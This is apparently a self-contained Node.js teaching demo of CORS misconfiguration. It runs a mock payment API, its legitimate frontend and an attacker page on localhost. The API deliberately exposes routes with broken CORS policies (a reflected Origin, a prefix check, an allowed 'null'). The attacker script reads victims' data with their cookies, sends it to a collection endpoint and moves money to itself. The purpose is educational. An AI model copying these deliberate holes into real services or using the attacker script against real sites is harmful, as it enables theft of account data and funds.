const express = require("express");
const crypto = require("crypto");

// THREE servers from one file, on three different origins:
const PORT = Number(process.env.PORT) || 3000;
const API_ORIGIN = `http://localhost:${PORT}`;              // PaisaPay API (holds the session cookie)
const FRONTEND_ORIGIN = `http://127.0.0.1:${PORT + 1}`;     // PaisaPay Web: the REAL frontend, on another site
const ATTACKER_ORIGIN = `http://127.0.0.1:${PORT + 2}`;     // Vikram's page (same host as the frontend, different port)
const SESSION_TTL_MS = 7 * 24 * 60 * 60 * 1000;

// ---------- "Database" ----------
// shortcut: in-memory Maps, lost on restart. A real app uses database tables.
const users = new Map();    // email -> { email, phone, salt, passwordHash, balance }
const sessions = new Map(); // sha256(sid) -> { email, expiresAt }

// ---------- Helpers ----------
const sha256 = (value) => crypto.createHash("sha256").update(value).digest("hex");
const str = (v) => (typeof v === "string" ? v : undefined);
const esc = (s) => String(s).replace(/[&<>"']/g, (c) => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" })[c]);
const parseCookies = (req) => Object.fromEntries((req.headers.cookie ?? "").split(";").filter((c) => c.includes("="))
  .map((c) => [c.slice(0, c.indexOf("=")).trim(), c.slice(c.indexOf("=") + 1).trim()]));

const DUMMY_SALT = crypto.randomBytes(16);
// shortcut: test accounts with known passwords. A real app has a signup (topic 06).
for (const [email, password, phone, balance] of [
  ["rahul@mail.com", "chai-and-code-42", "+91 98xxxxxx21", 10000],
  ["priya@mail.com", "priya-pass-77", "+91 99xxxxxx08", 500],
  ["vikram@mail.com", "vikram-pass-99", "+91 97xxxxxx66", 100],
]) {
  const salt = crypto.randomBytes(16);
  users.set(email, { email, phone, salt, passwordHash: crypto.scryptSync(password, salt, 64), balance });
}

// The frontend lives on ANOTHER SITE (127.0.0.1 vs localhost), so its fetch() calls are cross-site.
// A SameSite=Lax cookie would not be sent on them; it must be SameSite=None, which REQUIRES Secure.
// (Browsers treat http://localhost as secure, so Secure cookies work here without HTTPS.)
// That also means: no help from SameSite against CSRF any more. CORS and the Origin check have to be right.
const COOKIE = { httpOnly: true, secure: true, sameSite: "none", path: "/" };

function getSessionEmail(req) {
  const sid = parseCookies(req).sid;
  const s = sid && sessions.get(sha256(sid));
  return s && Date.now() <= s.expiresAt ? s.email : null;
}

const page = (title, body, bg = "#fff") => `<!doctype html><html lang="en"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1"><title>${esc(title)}</title>
<style>body{font-family:system-ui,sans-serif;max-width:640px;margin:48px auto;padding:0 16px;line-height:1.5;background:${bg}}
input,button{font:inherit;padding:8px 12px;margin:4px 0}input{width:100%;box-sizing:border-box}
pre{background:#f1f5f9;padding:8px;white-space:pre-wrap;word-break:break-all}</style></head><body>${body}</body></html>`;

// ===================================================================================
// 1. THE API: PaisaPay on localhost
// ===================================================================================
const api = express();
api.use(express.json({ limit: "10kb" }));
api.use(express.urlencoded({ extended: false, limit: "10kb" }));
api.use((req, res, next) => { res.set("Cache-Control", "no-store"); next(); });

// The CORS middleware. `isAllowed(origin)` is the ONLY thing that differs between the safe and the broken routes.
function cors(isAllowed) {
  return (req, res, next) => {
    const origin = req.get("origin");
    // The answer depends on Origin, so caches (CDN, browser) must keep one copy per Origin.
    // Without this, a response made for the frontend could be served to someone else (cache poisoning).
    res.vary("Origin");
    const allowed = origin !== undefined && isAllowed(origin);
    if (allowed) {
      res.set("Access-Control-Allow-Origin", origin);       // ONE exact origin, never "*" with credentials
      res.set("Access-Control-Allow-Credentials", "true");  // "the browser may show this response to a page that sent cookies"
    }
    // Preflight: before a non-simple request (JSON body, PUT/DELETE, custom headers) the browser asks first
    if (req.method === "OPTIONS") {
      if (allowed) {
        res.set("Access-Control-Allow-Methods", "GET, POST");
        res.set("Access-Control-Allow-Headers", "Content-Type");
        res.set("Access-Control-Max-Age", "600"); // the browser may skip asking again for 10 minutes
      }
      return res.status(204).end(); // not allowed → no CORS headers → the browser refuses to send the real request
    }
    // CORS only controls who may READ the response. A "simple" request (a form POST) still REACHES the server.
    // So writes also get an Origin check (CSRF, topic 47), using the same allow-list. Our own pages are fine too.
    if (req.method !== "GET" && req.method !== "HEAD" && origin && origin !== API_ORIGIN && !allowed) {
      return res.status(403).json({ error: `Origin ${origin} is not allowed` });
    }
    next();
  };
}

// The same two endpoints, mounted under every CORS policy so you can compare them
function accountRoutes(isAllowed) {
  const r = express.Router();
  r.use(cors(isAllowed));
  r.get("/me", (req, res) => {
    const email = getSessionEmail(req);
    if (!email) return res.status(401).json({ error: "Not signed in" });
    const u = users.get(email);
    res.json({ email: u.email, phone: u.phone, balance: u.balance });
  });
  r.post("/transfer", (req, res) => {
    const email = getSessionEmail(req);
    if (!email) return res.status(401).json({ error: "Not signed in" });
    if (!req.is("application/json")) return res.status(415).json({ error: "Send JSON" }); // a plain HTML form can't send JSON
    const to = str(req.body?.to)?.trim().toLowerCase();
    const amount = req.body?.amount;
    if (!Number.isInteger(amount) || amount < 1 || amount > 50000) return res.status(400).json({ error: "Amount must be a whole number from 1 to 50000" });
    if (!to || !users.has(to) || to === email) return res.status(400).json({ error: "Unknown recipient" });
    const from = users.get(email);
    if (from.balance < amount) return res.status(400).json({ error: "Not enough balance" });
    from.balance -= amount;
    users.get(to).balance += amount;
    console.log(`💸 ₹${amount} ${email} → ${to} (via ${req.baseUrl}/transfer, Origin: ${req.get("origin") ?? "none"})`);
    res.json({ message: `Sent ₹${amount} to ${to}`, balance: from.balance });
  });
  return r;
}

// ✅ SAFE: an exact allow-list of origins we own
const ALLOWED_ORIGINS = new Set([FRONTEND_ORIGIN]);
api.use("/api", accountRoutes((origin) => ALLOWED_ORIGINS.has(origin)));

// ❌ BROKEN 1: reflect whatever Origin was sent. "It fixed the CORS error!" (it fixed it for everyone, attackers too)
api.use("/vulnerable/reflect", accountRoutes(() => true));
// ❌ BROKEN 2: a prefix check. "http://127.0.0.1:3051" starts with "http://127.0.0.1" too.
// (In real life: startsWith("https://paisapay.in") also matches "https://paisapay.in.evil.com".)
api.use("/vulnerable/prefix", accountRoutes((origin) => origin.startsWith("http://127.0.0.1")));
// ❌ BROKEN 3: allowing "null" ("so local HTML files can test the API"). Any site can send Origin: null from a sandboxed iframe.
api.use("/vulnerable/null", accountRoutes((origin) => ALLOWED_ORIGINS.has(origin) || origin === "null"));

// 🚫 "*" with credentials: the BROWSER refuses it, so nothing leaks. It just doesn't work.
// This is the error that makes people switch to BROKEN 1.
api.get("/wildcard/me", (req, res) => {
  res.set("Access-Control-Allow-Origin", "*");
  res.set("Access-Control-Allow-Credentials", "true");
  const email = getSessionEmail(req);
  res.json(email ? { email } : { error: "Not signed in" });
});

// First-party login page on the API's own origin
api.get("/", (req, res) => {
  const email = getSessionEmail(req);
  if (!email) {
    return res.send(page("PaisaPay login", `<h1>🏦 PaisaPay</h1><form method="post" action="/login">
<input name="email" type="email" value="rahul@mail.com" autocomplete="username">
<input name="password" type="password" placeholder="Password" autocomplete="current-password"><button>Log in</button></form>
<p>Test account: <b>rahul@mail.com</b> / <b>chai-and-code-42</b></p>`));
  }
  res.send(page("PaisaPay", `<h1>🏦 PaisaPay</h1><p>Signed in as <b>${esc(email)}</b>. Balance ₹${users.get(email).balance}.</p>
<p>✅ The real app: <a href="${FRONTEND_ORIGIN}">${FRONTEND_ORIGIN}</a></p>
<p>😈 Vikram's page: <a href="${ATTACKER_ORIGIN}">${ATTACKER_ORIGIN}</a></p>
<form method="post" action="/logout"><button>Log out</button></form>`));
});

api.post("/login", (req, res) => {
  const origin = req.get("origin");
  if (origin && origin !== API_ORIGIN) return res.status(403).json({ error: "Log in on PaisaPay itself" }); // login CSRF (topic 47)
  const email = str(req.body?.email)?.trim().toLowerCase();
  const user = email ? users.get(email) : undefined;
  const hash = crypto.scryptSync(str(req.body?.password) ?? "", user?.salt ?? DUMMY_SALT, 64); // same time for unknown emails (topic 51)
  if (!user || !crypto.timingSafeEqual(hash, user.passwordHash)) return res.status(401).json({ error: "Wrong email or password" });
  const sid = crypto.randomBytes(32).toString("base64url");
  sessions.set(sha256(sid), { email: user.email, expiresAt: Date.now() + SESSION_TTL_MS });
  res.cookie("sid", sid, { ...COOKIE, maxAge: SESSION_TTL_MS });
  if (req.accepts(["json", "html"]) === "html") return res.redirect(303, "/");
  res.json({ message: `Logged in as ${user.email}` });
});

api.post("/logout", (req, res) => {
  const sid = parseCookies(req).sid;
  if (sid) sessions.delete(sha256(sid));
  res.clearCookie("sid", COOKIE);
  res.redirect(303, "/");
});

api.use((req, res) => res.status(404).json({ error: "Not found" }));
api.use((err, req, res, next) => {
  if (err.type === "entity.parse.failed") return res.status(400).json({ error: "Body must be valid JSON" });
  if (err.type === "entity.too.large") return res.status(413).json({ error: "Request body too large" });
  console.error(err);
  res.status(500).json({ error: "Something went wrong" });
});
api.listen(PORT, () => console.log(`🏦 PaisaPay API on ${API_ORIGIN}  ← log in here first`));

// ===================================================================================
// 2. THE REAL FRONTEND: PaisaPay Web on 127.0.0.1 (another site)
// ===================================================================================
// These browser scripts are written as normal functions and sent with .toString(), so they're easy to read.
function frontendScript(API) {
  const show = (text) => { document.getElementById("out").textContent = text; };
  async function load() {
    try {
      const r = await fetch(API + "/api/me", { credentials: "include" }); // "include" = send the PaisaPay cookie
      show("GET /api/me → " + JSON.stringify(await r.json(), null, 2));
    } catch (e) { show("Blocked: " + e.message); }
  }
  document.getElementById("send").onclick = async () => {
    // JSON body → the browser sends a preflight OPTIONS first, then this POST
    const r = await fetch(API + "/api/transfer", { method: "POST", credentials: "include",
      headers: { "Content-Type": "application/json" }, body: JSON.stringify({ to: "priya@mail.com", amount: 100 }) });
    show("POST /api/transfer → " + JSON.stringify(await r.json()));
  };
  document.getElementById("wild").onclick = async () => {
    try { await fetch(API + "/wildcard/me", { credentials: "include" }); show("Read /wildcard/me (unexpected!)"); }
    catch (e) { show("❌ /wildcard/me: " + e.message + "\nConsole: '*' is not allowed when credentials are included."); }
  };
  load();
}

const frontend = express();
frontend.get("/", (req, res) => res.send(page("PaisaPay Web", `<h1>💳 PaisaPay Web</h1>
<p>I'm the real frontend on <code>${FRONTEND_ORIGIN}</code>. My data comes from <code>${API_ORIGIN}</code>.</p>
<pre id="out">loading…</pre>
<button id="send">Send ₹100 to Priya</button> <button id="wild">Try /wildcard/me</button>
<script>(${frontendScript.toString()})(${JSON.stringify(API_ORIGIN)});</script>`)));
frontend.listen(PORT + 1, () => console.log(`💳 PaisaPay Web (the real frontend) on ${FRONTEND_ORIGIN}`));

// ===================================================================================
// 3. THE ATTACKER: Vikram's page
// ===================================================================================
function attackerScript(API) {
  const out = (id, text) => { document.getElementById(id).textContent = text; };
  const report = (via, data) => fetch("/collect", { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({ via, data }) });
  async function tryRead(id, path) {
    try {
      const r = await fetch(API + path, { credentials: "include" });
      const data = await r.json();
      out(id, "😱 Read it: " + JSON.stringify(data));
      report(path, data);
    } catch (e) { out(id, "🛡️ Blocked by the browser: " + e.message); }
  }
  tryRead("api", "/api/me");
  tryRead("reflect", "/vulnerable/reflect/me");
  tryRead("prefix", "/vulnerable/prefix/me");
  // shortcut: no "Origin: null" attack here. On public sites a sandboxed <iframe> sends Origin: null and the attack
  // works, but browsers block requests from sandboxed frames to localhost addresses, so this demo shows it with curl.

  // Writing, not just reading: a JSON POST needs a preflight. Whoever passes the preflight can move money.
  for (const [btn, path] of [["steal-reflect", "/vulnerable/reflect/transfer"], ["steal-api", "/api/transfer"]]) {
    document.getElementById(btn).onclick = async () => {
      try {
        const r = await fetch(API + path, { method: "POST", credentials: "include",
          headers: { "Content-Type": "application/json" }, body: JSON.stringify({ to: "vikram@mail.com", amount: 1000 }) });
        out(btn + "-out", (r.ok ? "😱 " : "") + JSON.stringify(await r.json()));
      } catch (e) { out(btn + "-out", "🛡️ Blocked by the browser: " + e.message); }
    };
  }
}

const evil = express();
evil.use(express.json({ limit: "10kb" }));
evil.get("/", (req, res) => res.send(page("Free cashback!", `<h1>🎁 Free ₹500 cashback!</h1>
<p>You are on <code>${ATTACKER_ORIGIN}</code>. Reading <code>${API_ORIGIN}</code> with your cookie:</p>
<p><b>/api/me</b> (exact allow-list): <code id="api">…</code></p>
<p><b>/vulnerable/reflect/me</b> (reflects any Origin): <code id="reflect">…</code></p>
<p><b>/vulnerable/prefix/me</b> (startsWith check): <code id="prefix">…</code></p>
<p><button id="steal-reflect">Take ₹1000 via /vulnerable/reflect/transfer</button> <code id="steal-reflect-out"></code></p>
<p><button id="steal-api">Take ₹1000 via /api/transfer</button> <code id="steal-api-out"></code></p>
<script>(${attackerScript.toString()})(${JSON.stringify(API_ORIGIN)});</script>`, "#fff7ed")));
evil.post("/collect", (req, res) => {
  console.log(`🕵️  Stolen via ${String(req.body?.via).slice(0, 60)}: ${JSON.stringify(req.body?.data).slice(0, 300)}`);
  res.status(204).end();
});
evil.use((req, res) => res.status(404).send("Not found"));
evil.listen(PORT + 2, () => console.log(`😈 Vikram's page on ${ATTACKER_ORIGIN}`));

setInterval(() => {
  const now = Date.now();
  for (const [k, s] of sessions) if (now > s.expiresAt) sessions.delete(k);
}, 60_000).unref();
